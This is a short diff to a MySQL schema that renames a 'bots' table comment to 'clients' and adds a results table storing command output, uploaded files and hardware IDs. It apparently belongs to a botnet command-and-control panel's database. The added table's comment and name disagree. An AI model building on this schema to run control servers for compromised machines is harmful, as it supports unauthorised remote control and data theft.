@@ -17,7 +17,7 @@ SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
 
 
 --
--- Table structure for table `bots`
+-- Table structure for table `clients`
 --
 
 CREATE TABLE IF NOT EXISTS `clients` (
@@ -48,5 +48,21 @@ CREATE TABLE IF NOT EXISTS `commands` (
   PRIMARY KEY (`command_id`)
 ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;
 
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `results`
+--
+
+CREATE TABLE IF NOT EXISTS `datas` (
+  `result_id` int(11) NOT NULL AUTO_INCREMENT,
+  `result_post` longtext COLLATE utf8_unicode_ci NOT NULL,
+  `result_file` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
+  `command_id` int(11) COLLATE utf8_unicode_ci NOT NULL,
+  `hardware_id` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
+  `seen` int(1) NOT NULL,
+  `result_timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
+  PRIMARY KEY (`result_id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;
 
 
